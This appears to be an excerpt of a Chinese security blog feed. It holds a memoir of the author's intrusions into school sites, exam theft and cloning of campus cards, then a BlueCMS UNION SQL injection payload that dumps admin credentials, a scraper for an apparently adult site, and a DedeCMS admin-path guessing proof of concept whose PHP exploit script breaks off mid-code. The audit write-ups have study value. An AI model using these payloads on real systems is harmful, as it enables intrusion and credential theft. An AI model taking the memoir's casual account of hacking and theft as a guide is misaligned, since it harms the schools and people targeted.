    <content type="html"><![CDATA[<p>嗯，一个文笔菜如老狗的我，我想写点什么，各位看官看看就好。</p><p>今年20出头，我相信大家入这行大多数都是从刷钻还有帐号被盗开始，我也不例外。<br>记得读初三的时候，开始接触刷钻，那个时候都是用手机卡刷钻。读到高一的时候，也就是那个时候开始，算是刚接触这行吧。<br>那个时候找了个师傅，好像花了50。。。。不过那时候学生党没有多少钱。当时学刷宽带钻，还有什么入侵啥的，反正当时觉得特别牛逼。<br>还有什么入侵三字经，慢慢的发现，叫他教技术总是各种敷衍，后来知道了他是骗子以后，就把我拉黑了。当时为了刷宽带钻，抓鸡而买了一台服务器。</p><a id="more"></a><p>记得那个时候，学习的地方叫做黑基，然后加了群，认识了一个群主叫小风的，还记得有个叫罪叔叔的，总是开玩笑的说卖河南大饼。不过，现在都没联系了。<br>在黑基里面，学过哪些东西我不记得了，只记得当时学什么UBB排版吧，当时写了一个QQ空间的登录页面，那时候读高一，网上认识的一个朋友和我说学习html吧，他也算是我的启蒙老师吧，反正那个时候不会的我都会问他。<br>不记得怎么接触渗透的了，记得有一次，用网上的什么0day，进了别人的后台，好像是个什么新闻的。发现首页有太多日本的字眼，然后我把首页改了，留了自己的ID和QQ号（那时候不懂事，勿喷），那个时候ID好像还叫灰灰（是以前的女朋友起的，现在想起来都觉得我这种大叔类型的人，为啥会用这个ID）。。。。<br>后来上课的时候接到一个电话，是那个网站站长打给我的，问我是不是灰灰，说我在他网站上面留下了QQ号，然后我吓得说了一句你打错了，我在上课，就挂了。<br>当时突然想拿自己的高中学校网站练手，好像就是那个时候认识了土司论坛的恋安，也就是你们说的xuehei大佬，现在想想，和他认识可能也快有5年了，也许更久吧。<br>我当时因为太菜，搞高中学校网站搞不下，然后叫恋安帮我，恋安说了一句从来没见过这么丑的网站。网站是学校老师自己用aspx写的。<br>嗯，老版的网站始终没搞下，现在网站也改新的了。<br>高中毕业后，163邮箱裤子出来了，之前查过学校的域名，是163邮箱注册的，然后用一个网站查到了密码，随手去后台地址试了试，登录成功。<br>起码拿到了学校网站的后台权限，至于shell吧，凡科建站，我是真的无奈。</p><p>由于高中全部在折腾这方面的，学习直接没学，高考考了211，是分数，不是学校。进了一所二流的专科， 大一的时候，选了计算机网络技术，至于html和c语言啥的，我高中就学完了，现在什么都不记得了，反正直接考了个计算机二级C，没屁用的证书。<br>大一的时候，参加了叫赣安杯的比赛，一个人带着两个大二的学长。预赛是做题，当时太菜了，勉勉强强进了决赛。<br>在决赛的时候被老师坑了一波，他告诉我不用带电脑，比赛方会提供的，所以我们三个人就带了一台电脑去，是一个学长的，上面什么都没。在决赛被打得很惨。<br>不过很庆幸，在决赛上认识了vking和另一个老哥（这里不知道ID，不提名字了）。只记得当时v哥台式机都带去了。<br>大一第一次期末考试，莫名的慌，听说考不好会挂科，高考数学29的我，看到高数就头疼。<br>一次偶然的机会，帮教务处的主任装系统，知道了考试卷放在哪台电脑上，后来我神不知鬼不觉的把所有工程系的试卷和答案偷了出来。。。（考卷是随机抽的，最后考了经管系的试卷，只有专业课考了自己老师出的）</p><p>后来看到碧哥破解学校的水卡，至于碧哥，后面再说吧。我当时也买了NFC设备，自己花了一个月的时间算一卡通的加密算法，一卡通有三个功能，吃饭，打水和洗澡。发现卡的数据是存放在卡里的，而且没有任何信息登记。当时去充卡的地方问那个人说我卡掉了，能不能帮我查下有没有人捡到我的卡用我的钱，那个人问我知不知道卡号，我说用名字不能查吗，他说办卡的时候没登记任何信息。我就走了，然后就你们懂的。。。。</p><p>后来考驾照，土豆找我说他要日他们驾校，然后我们一起拿到了服务器权限，后来我也搞了学校驾校一波，但是不知道为什么没有太多妹子信息。</p><p>记得有一次搞一个妹子的学校，拿到了内网权限，当时ms17-010刚出来，我全家桶都搬到服务器上去了，打算慢慢玩。后来，勒索病毒爆发，管理员加班几天，网站入口关了，因为没留后门，导致权限丢失。现在那妹子是我女朋友了。</p><p>记得小时候说过会把小学毕业照挂到学校的网站首页上，刚开始太菜，拿不下。后来我做到了，本来打算挂首页一天，第二天会恢复，后来想想，让黑页留在根目录下吧，也算是怀念下自己的童年。现在网站域名到期了，昨晚看了下被其他学校注册了。。。。</p><p>故事太多，文笔太烂，不知道怎么说，当初认识了渗透吧吧主，当时把我拉进了一个叫大风车的小群。<br>在群里认识了很多人，虽然没学到什么，但是大家都很开心的聊天。<br>但是，现在，进去的进去了，失踪的失踪了。发生了太多了。</p><p>从当初在动车上看到的广告网站我都会动手，到现在看到网站都会苦笑。我真的变了。</p><p>现在也毕业了，前几天刚谈转正工资，3k5。这么多年来，就值3k5，打算撤了。<br>也许会继续做这行，也许会离开这行。<br>这些年失去太多了，真的累了。</p>]]></content>
    
    
    <categories>
      
      <category>胡思乱想</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BlueCms v1.6 Union注入</title>
    <link href="/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/BlueCms-v1-6-Union%E6%B3%A8%E5%85%A5.html"/>
    <url>/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/BlueCms-v1-6-Union%E6%B3%A8%E5%85%A5.html</url>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>非常基础的代码审计练习，适合有php基础的审计新手练习</p><h1 id="0x01-代码跟踪"><a href="#0x01-代码跟踪" class="headerlink" title="0x01 代码跟踪"></a>0x01 代码跟踪</h1><p>首先，进入首页代码 ：index.php</p><p>![BlueCms v1.6 Union注入](/images/20180525_BlueCms v1.6 Union注入/01.png)</p><p>包含了php文件：/include/common.inc.php</p><a id="more"></a><p>跟踪这个php文件，这些文件都是包含的全局文件。</p><p>![BlueCms v1.6 Union注入](/images/20180525_BlueCms v1.6 Union注入/02.png)</p><p>这个php文件还是先包含了几个全局文件。<br>最主要的是上图最下方的if判断：</p><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!get_magic_quotes_gpc())&#123;   <span class="hljs-variable">$_POST</span> = deep_addslashes(<span class="hljs-variable">$_POST</span>);   <span class="hljs-variable">$_GET</span> = deep_addslashes(<span class="hljs-variable">$_GET</span>);   <span class="hljs-variable">$_COOKIES</span> = deep_addslashes(<span class="hljs-variable">$_COOKIES</span>);   <span class="hljs-variable">$_REQUEST</span> = deep_addslashes(<span class="hljs-variable">$_REQUEST</span>);&#125;</code></pre><p>如果未开启magic_quotes_gpc，则对以各种请求的数据使用deep_addslashes()进行过滤，跟踪一下这个函数：</p><p>![BlueCms v1.6 Union注入](/images/20180525_BlueCms v1.6 Union注入/03.png)</p><p>对传入的的$str，无论是数组还是字符串，使用addslashes()进行过滤。</p><p><strong>PS：magic_quotes_gpc=On的情况下，如果输入的数据有，单引号（’）、双引号（”）、反斜线（）与 NUL（NULL 字符）等字符都会被加上反斜线。这些转义是必须的，如果这个选项为off，那么我们就必须调用addslashes这个函数来为字符串增加转义。</strong></p><h1 id="0x02-注入分析"><a href="#0x02-注入分析" class="headerlink" title="0x02 注入分析"></a>0x02 注入分析</h1><p>在Sublime使用CTRL+SHIFT+F全局搜索：$_GET<br>寻找以GET方式传入的参数：</p><p>![BlueCms v1.6 Union注入](/images/20180525_BlueCms v1.6 Union注入/04.png)</p><p>使用红框圈起来的这条有异常。<br>ad_id明显是文章或者广告的id，并没有使用intval强制转化为整数型而是使用了trim()函数来去除了前后的空格，有点看不懂。<br>此时还不能完全确定存在注入，跟踪到这行代码看一下：</p><p>![BlueCms v1.6 Union注入](/images/20180525_BlueCms v1.6 Union注入/05.png)</p><p>这次确定，对传入的ad_id只判断了是否为空，去除了前后的空格，此外也就多了一个全局的addslashes()转义了一下特殊字符，直接进行了SQL查询。<br>将SQL语句传入了getone()函数，很明显getone是进行SQL查询的函数，跟进。<br>getone()函数：</p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getone</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span>, <span class="hljs-variable">$type</span>=MYSQL_ASSOC</span>)</span>&#123;   <span class="hljs-variable">$query</span> = <span class="hljs-keyword">$this</span>-&gt;query(<span class="hljs-variable">$sql</span>,<span class="hljs-keyword">$this</span>-&gt;linkid);   <span class="hljs-variable">$row</span> = mysql_fetch_array(<span class="hljs-variable">$query</span>, <span class="hljs-variable">$type</span>);   <span class="hljs-keyword">return</span> <span class="hljs-variable">$row</span>;&#125;</code></pre><p>query()函数：</p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">query</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span></span>)</span>&#123;    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$query</span>=@mysql_query(<span class="hljs-variable">$sql</span>, <span class="hljs-keyword">$this</span>-&gt;linkid))&#123;        <span class="hljs-keyword">$this</span>-&gt;dbshow(<span class="hljs-string">&quot;Query error:<span class="hljs-subst">$sql</span>&quot;</span>);    &#125;<span class="hljs-keyword">else</span>&#123;         <span class="hljs-keyword">return</span> <span class="hljs-variable">$query</span>;    &#125;&#125;</code></pre><p>第一个if，如果执行发生错误，将错误信息”Query errorsql”传入dbshow()函数。<br>dbshow()函数：</p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dbshow</span>(<span class="hljs-params"><span class="hljs-variable">$msg</span></span>)</span>&#123;    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$msg</span>)&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error：&quot;</span>.<span class="hljs-variable">$msg</span>.<span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Errno：&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;errno().<span class="hljs-string">&quot;&lt;br&gt;Error：&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;error();    &#125;    <span class="hljs-keyword">exit</span>;&#125;</code></pre><p>作用是输出错误信息。<br>之后回到ad_js.php文件：</p><p>![BlueCms v1.6 Union注入](/images/20180525_BlueCms v1.6 Union注入/06.png)</p><p>$ad_content输出查询信息。<br>输出形式：</p><pre><code class="hljs javascript">&lt;!--<span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;test&quot;</span>);--&gt;</code></pre><h1 id="0x03-构造Payload"><a href="#0x03-构造Payload" class="headerlink" title="0x03 构造Payload"></a>0x03 构造Payload</h1><p>正常的SQL查询语句为：</p><pre><code class="hljs mysql">select * from blue_ad where ad_id&#x3D;1</code></pre><p>因为直接回显查询内容，所以直接union注入咯。<br>看一下数据库结构：</p><p>![BlueCms v1.6 Union注入](/images/20180525_BlueCms v1.6 Union注入/07.png)</p><p>我们需要的数据列名为admin_name和pwd，构造PayLoad：</p><pre><code class="hljs mysql">select * from blue_ad where ad_id&#x3D;-1 union select 1,2,3,4,5,6,concat(admin_name,0x23,pwd) from blue_admin limit 0,1#</code></pre><p>执行后查看源码：</p><p>![BlueCms v1.6 Union注入](/images/20180525_BlueCms v1.6 Union注入/08.png)</p><pre><code class="hljs javascript">&lt;!--<span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;admin#21232f297a57a5a743894a0e4a801fc3&quot;</span>);--&gt;</code></pre>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一款不正经的老司机爬虫</title>
    <link href="/%E4%B8%80%E4%BA%9B%E8%84%9A%E6%9C%AC/%E5%8F%88%E4%B8%80%E6%AC%BE%E8%80%81%E5%8F%B8%E6%9C%BA%E7%88%AC%E8%99%AB.html"/>
    <url>/%E4%B8%80%E4%BA%9B%E8%84%9A%E6%9C%AC/%E5%8F%88%E4%B8%80%E6%AC%BE%E8%80%81%E5%8F%B8%E6%9C%BA%E7%88%AC%E8%99%AB.html</url>
    
    <content type="html"><![CDATA[<p>昨晚打开网页逛啊逛的，不知道怎么就逛到某网站上去了。。。。<br>然后顺手写了个爬虫，代码写的有点渣。还是丢出来大家一起探讨下。<br>起初是打算一个个按文件夹分类的，后来发现看起来不过瘾，每个文件夹里就那个几张图片，于是就省略了。</p><p>先附一张程序运行图，证明能用</p><p><img src="/images/20180421_%E5%8F%88%E4%B8%80%E6%AC%BE%E8%80%81%E5%8F%B8%E6%9C%BA%E7%88%AC%E8%99%AB/01.png" alt="又一款老司机爬虫"></p><a id="more"></a><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">Created on 2018年4月21日</span><span class="hljs-string">图片地址：http://k1.lsxwk.com/1/20160403/e50ebb725cb31939210.jpg</span><span class="hljs-string">@author: iceH</span><span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-keyword">import</span> urllib.request<span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> multiprocessing<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">open_url</span>(<span class="hljs-params">url</span>):</span>    req = urllib.request.Request(url)    req.add_header(<span class="hljs-string">&#x27;User-Agent&#x27;</span>,<span class="hljs-string">&#x27;Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0&#x27;</span>)    response = urllib.request.urlopen(req)    html = response.read()    <span class="hljs-keyword">return</span> html    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">second_page</span>(<span class="hljs-params">page_url</span>):</span>    <span class="hljs-keyword">try</span>:        <span class="hljs-built_in">list</span> = []        p = <span class="hljs-string">r&#x27;&lt;a href=&quot;(/zipaitoupai/1[^&quot;]+\.html)&#x27;</span>        html = open_url(page_url).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)        page = re.findall(p, html)                <span class="hljs-keyword">for</span> each <span class="hljs-keyword">in</span> page:            page = <span class="hljs-string">&#x27;http://aiyaolulu.org&#x27;</span> + each            <span class="hljs-built_in">list</span>.append(page)        <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>    <span class="hljs-keyword">except</span>:        print(<span class="hljs-string">&#x27;出错了&#x27;</span>)        time.sleep(<span class="hljs-number">1</span>)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find_img</span>(<span class="hljs-params">img_url</span>):</span>    <span class="hljs-keyword">try</span>:        html = open_url(img_url).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)        p = <span class="hljs-string">r&#x27;&lt;img src=&quot;(http[^&quot;]+)&#x27;</span>        img_list = re.findall(p, html)        <span class="hljs-keyword">return</span> img_list    <span class="hljs-keyword">except</span>:        print(<span class="hljs-string">&#x27;出错了&#x27;</span>)        time.sleep(<span class="hljs-number">1</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_title</span>(<span class="hljs-params">url</span>):</span>    <span class="hljs-keyword">try</span>:        html = open_url(url).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)        p = <span class="hljs-string">r&#x27;&lt;title&gt;(.+?)_爱要撸&#x27;</span>        title = re.findall(p, html)        title = <span class="hljs-string">&#x27;&#x27;</span>.join(title)        <span class="hljs-comment"># print(title)</span>        <span class="hljs-keyword">return</span> title    <span class="hljs-keyword">except</span>:        print(<span class="hljs-string">&#x27;出错了&#x27;</span>)        time.sleep(<span class="hljs-number">1</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">down_img</span>(<span class="hljs-params">title_dir,second_url</span>):</span>    <span class="hljs-comment"># os.mkdir(folder)</span>    <span class="hljs-comment"># os.chdir(folder)</span>    f = <span class="hljs-number">1</span>    first_img_list = find_img(second_url)    <span class="hljs-comment"># print(first_img_list)</span>    <span class="hljs-keyword">try</span>:        <span class="hljs-keyword">for</span> img <span class="hljs-keyword">in</span> first_img_list:            print(<span class="hljs-string">&#x27;[*]正在下载[%s]的第%d张图片&#x27;</span> % (title_dir, f))            filename = title_dir + <span class="hljs-built_in">str</span>(f) + <span class="hljs-string">&#x27;.jpg&#x27;</span>            <span class="hljs-comment"># print(filename)</span>            response = urllib.request.urlopen(img)            se_img = response.read()            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> m:                m.write(se_img)            f += <span class="hljs-number">1</span>        f = <span class="hljs-number">1</span>    <span class="hljs-keyword">except</span>:        print(<span class="hljs-string">&#x27;[*]ε=ε=ε=ε=┌(;￣◇￣)┘等待10秒后继续=====&#x27;</span>)        time.sleep(<span class="hljs-number">10</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">page</span>):</span>    url = <span class="hljs-string">&#x27;http://aiyaolulu.org/zipaitoupai/list_%d.html&#x27;</span> % page    page_url = second_page(url)    <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> page_url:        title_dir = get_title(url)        <span class="hljs-comment"># print(title_dir,url)</span>        down_img(title_dir,url)        <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    multiprocessing.freeze_support()<span class="hljs-comment">#防止打包后出错</span>    text = <span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">      ____             _             _    _ </span><span class="hljs-string">     |  _ \         _ (_)           | |  | |</span><span class="hljs-string">     | |_) | _   _ (_) _   ___  ___ | |__| |</span><span class="hljs-string">     |  _ &lt; | | | |   | | / __|/ _ \|  __  |</span><span class="hljs-string">     | |_) || |_| | _ | || (__|  __/| |  | |</span><span class="hljs-string">     |____/  \__, |(_)|_| \___|\___||_|  |_|</span><span class="hljs-string">              __/ |                         </span><span class="hljs-string">             |___/</span><span class="hljs-string">                     </span><span class="hljs-string">           数据来源：http://aiyaolulu.org</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>    print(<span class="hljs-string">&#x27;*&#x27;</span> * <span class="hljs-number">50</span>)    print(text + <span class="hljs-string">&#x27;\033[0m\n&#x27;</span>)    print(<span class="hljs-string">&#x27;*&#x27;</span> * <span class="hljs-number">50</span>)    pool = multiprocessing.Pool()    pool.<span class="hljs-built_in">map</span>(main, [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>)])</code></pre><p>考虑到有的人没有安装PY环境，已经将程序打包成exe给大家了（劝各位别在直接桌面打开）</p>]]></content>
    
    
    <categories>
      
      <category>一些脚本</category>
      
    </categories>
    
    
    <tags>
      
      <tag>爬虫</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>解决DEDECMS历史难题--找后台目录</title>
    <link href="/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E8%A7%A3%E5%86%B3DEDECMS%E5%8E%86%E5%8F%B2%E9%9A%BE%E9%A2%98-%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95.html"/>
    <url>/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E8%A7%A3%E5%86%B3DEDECMS%E5%8E%86%E5%8F%B2%E9%9A%BE%E9%A2%98-%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95.html</url>
    
    <content type="html"><![CDATA[<h3 id="利用限制"><a href="#利用限制" class="headerlink" title="利用限制"></a>利用限制</h3><ul><li>  仅针对windows系统</li></ul><h3 id="进入正题"><a href="#进入正题" class="headerlink" title="进入正题"></a>进入正题</h3><p>首先看核心文件common.inc.php 大概148行左右</p><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>)&#123;    <span class="hljs-keyword">require_once</span>(DEDEINC.<span class="hljs-string">&#x27;/uploadsafe.inc.php&#x27;</span>);&#125;</code></pre><a id="more"></a><p>uploadsafe.inc.php</p><pre><code class="hljs php"><span class="hljs-keyword">if</span>( preg_match(<span class="hljs-string">&#x27;#^(cfg_|GLOBALS)#&#x27;</span>, <span class="hljs-variable">$_key</span>) )&#123;    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Request var not allow for uploadsafe!&#x27;</span>);&#125;<span class="hljs-variable">$$_key</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_key</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]; <span class="hljs-comment">//获取temp_name </span>$&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_name&#x27;</span>&#125; = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_key</span>][<span class="hljs-string">&#x27;name&#x27;</span>];$&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_type&#x27;</span>&#125; = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_key</span>][<span class="hljs-string">&#x27;type&#x27;</span>] = preg_replace(<span class="hljs-string">&#x27;#[^0-9a-z\./]#i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_key</span>][<span class="hljs-string">&#x27;type&#x27;</span>]);$&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_size&#x27;</span>&#125; = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_key</span>][<span class="hljs-string">&#x27;size&#x27;</span>] = preg_replace(<span class="hljs-string">&#x27;#[^0-9]#&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_key</span>][<span class="hljs-string">&#x27;size&#x27;</span>]);<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_name&#x27;</span>&#125;) &amp;&amp; (preg_match(<span class="hljs-string">&quot;#\.(&quot;</span>.<span class="hljs-variable">$cfg_not_allowall</span>.<span class="hljs-string">&quot;)$#i&quot;</span>,$&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_name&#x27;</span>&#125;) || !preg_match(<span class="hljs-string">&quot;#\.#&quot;</span>, $&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_name&#x27;</span>&#125;)) )&#123;    <span class="hljs-keyword">if</span>(!defined(<span class="hljs-string">&#x27;DEDEADMIN&#x27;</span>))    &#123;        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Not Admin Upload filetype not allow !&#x27;</span>);    &#125;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>($&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_size&#x27;</span>&#125;))&#123;    $&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_size&#x27;</span>&#125; = @filesize(<span class="hljs-variable">$$_key</span>);&#125;<span class="hljs-variable">$imtypes</span> = <span class="hljs-keyword">array</span>(    <span class="hljs-string">&quot;image/pjpeg&quot;</span>, <span class="hljs-string">&quot;image/jpeg&quot;</span>, <span class="hljs-string">&quot;image/gif&quot;</span>, <span class="hljs-string">&quot;image/png&quot;</span>,     <span class="hljs-string">&quot;image/xpng&quot;</span>, <span class="hljs-string">&quot;image/wbmp&quot;</span>, <span class="hljs-string">&quot;image/bmp&quot;</span>);<span class="hljs-keyword">if</span>(in_array(strtolower(trim($&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_type&#x27;</span>&#125;)), <span class="hljs-variable">$imtypes</span>))&#123;    <span class="hljs-variable">$image_dd</span> = @getimagesize(<span class="hljs-variable">$$_key</span>);     <span class="hljs-comment">//问题就在这里，获取文件的size，获取不到说明不是图片或者图片不存在，不存就exit upload.... ,利用这个逻辑猜目录的前提是目录内有图片格式的文件。</span>    <span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$image_dd</span>))    &#123;        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Upload filetype not allow !&#x27;</span>);    &#125;&#125;......</code></pre><p>注意<code>$$_key</code>这一句，变量<code>$key</code>取自于<code>$_FILE</code>，由于<code>$_FILE</code>可控自然<code>$key</code>也可控,此处理论上是可以覆盖任意变量，但是前面有个正则判断不能出现<code>cfg_|GLOBALS</code>。(但是应该还可以覆盖其他变量此处感觉还可以深挖)</p><p>本人出发点是找个可以利用<code>&lt;&lt;</code>通配符猜解后台目录，所以只要<code>$$_key</code>参数可控就可以达到目的。</p><p>但在这之前有个<code>if(!defined(&#39;DEDEADMIN&#39;))</code>的判断,这个很好绕过设置<code>tmp_name为0或者1.jpg含.</code> 就可以绕过。</p><p>最后关键的一点就是要让文件存在还和不存在返回不同的内容就要控制type参数了。</p><p>当目录文件存在的时候 返回正常页面。当不存在的时候返回：Upload filetype not allow !</p><h3 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h3><p>文字不好表达，便于理解。</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// ./dedecms/favicon.ico</span><span class="hljs-keyword">if</span>(@getimagesize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;poc&#x27;</span>]))&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-number">1</span>;&#125;<span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-meta">?&gt;</span>get:http:<span class="hljs-comment">//localhost/test.php?poc=./d&lt;/favicon.ico</span>返回：<span class="hljs-number">1</span>http:<span class="hljs-comment">//localhost/test.php?poc=./a&lt;/favicon.ico</span>返回：<span class="hljs-number">0</span>http:<span class="hljs-comment">//localhost/test.php?poc=./de&lt;/favicon.ico</span>返回：<span class="hljs-number">1</span>http:<span class="hljs-comment">//localhost/test.php?poc=./ded&lt;/favicon.ico</span>返回：<span class="hljs-number">1</span>........</code></pre><h3 id="构造poc"><a href="#构造poc" class="headerlink" title="构造poc"></a>构造poc</h3><pre><code class="hljs sqf">http:<span class="hljs-comment">//localhost/dedecms/tags.php</span>post:dopost=save&amp;<span class="hljs-variable">_FILES</span>[b4dboy][tmp_name]=./de&lt;/images/admin_top_logo.gif&amp;<span class="hljs-variable">_FILES</span>[b4dboy][<span class="hljs-built_in">name</span>]=<span class="hljs-number">0</span>&amp;<span class="hljs-variable">_FILES</span>[b4dboy][<span class="hljs-built_in">size</span>]=<span class="hljs-number">0</span>&amp;<span class="hljs-variable">_FILES</span>[b4dboy][<span class="hljs-built_in">type</span>]=<span class="hljs-built_in">image</span>/gif</code></pre><p>Common.inc.php 是被全局包含的文件，只要文件php文件包含了Common.inc.php都可以进行测试，以tags.php文件为例</p><p>当目录存在点时候： </p><p><img src="/images/20180226_%E8%A7%A3%E5%86%B3DEDECMS%E5%8E%86%E5%8F%B2%E9%9A%BE%E9%A2%98--%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95/01.png" alt="解决DEDECMS历史难题--找后台目录"></p><p>当目录不存在点时候： </p><p><img src="/images/20180226_%E8%A7%A3%E5%86%B3DEDECMS%E5%8E%86%E5%8F%B2%E9%9A%BE%E9%A2%98--%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95/02.png" alt="解决DEDECMS历史难题--找后台目录"></p><h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$domain</span>=<span class="hljs-string">&#x27;http://localhost/dedecms/&#x27;</span>;<span class="hljs-variable">$url</span>=<span class="hljs-variable">$domain</span>.<span class="hljs-string">&#x27;/index.php&#x27;</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">post</span>(<span class="hljs-params"><span class="hljs-variable">$url</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$cookie</span> = <span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;    <span class="hljs-variable">$options</span> = <span class="hljs-keyword">array</span>(        CURLOPT_RETURNTRANSFER =&gt; <span class="hljs-literal">true</span>,        CURLOPT_HEADER =&gt; <span class="hljs-literal">true</span>,        CURLOPT_POST =&gt; <span class="hljs-literal">true</span>,        CURLOPT_SSL_VERIFYHOST =&gt; <span class="hljs-literal">false</span>,        CURLOPT_SSL_VERIFYHOST =&gt; <span class="hljs-literal">false</span>,        CURLOPT_COOKIE =&gt; <span class="hljs-variable">$cookie</span>,        CURLOPT_POSTFIELDS =&gt; <span class="hljs-variable">$data</span>,    );    <span class="hljs-variable">$ch</span> = curl_init(<span class="hljs-variable">$url</span>);    curl_setopt_array(<span class="hljs-variable">$ch</span>, <span class="hljs-variable">$options</span>);    <span class="hljs-variable">$result</span> = curl_exec(<span class="hljs-variable">$ch</span>);    curl_close(<span class="hljs-variable">$ch</span>);    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;&#125;<span class="hljs-variable">$testlen</span>=<span class="hljs-number">25</span>;<span class="hljs-variable">$str</span>=range(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;z&#x27;</span>);<span class="hljs-variable">$number</span>=range(<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$dic</span> = array_merge(<span class="hljs-variable">$str</span>, <span class="hljs-variable">$number</span>);<span class="hljs-variable">$n</span>=<span class="hljs-literal">true</span>;<span class="hljs-variable">$nn</span>=<span class="hljs-literal">true</span>;<span 